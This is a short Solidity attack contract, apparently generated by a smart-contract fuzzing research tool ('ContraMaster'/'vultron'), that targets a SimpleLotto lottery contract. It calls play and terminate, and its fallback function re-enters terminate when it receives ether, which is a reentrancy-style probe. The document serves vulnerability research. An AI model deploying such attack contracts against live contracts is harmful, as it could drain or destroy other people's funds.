pragma solidity ^0.4.19;

import "/home/hjwang/Tools/ContraMaster/contracts/SimpleLotto.sol";

contract Attack_SimpleLotto1 {

  SimpleLotto public target_contract;

  function Attack_SimpleLotto1(address _targetContract) public payable {
      target_contract = SimpleLotto(_targetContract);
  } 

  function vultron_play(address receiver, uint256 amount) public {
    target_contract.play(receiver, amount);
  } 

  function vultron_terminate() public {
    target_contract.terminate();
  } 

  function vultron_terminateAlt() public {
    target_contract.terminateAlt();
  } 

      function() public payable {
        
        target_contract.terminate();
      }
      } 
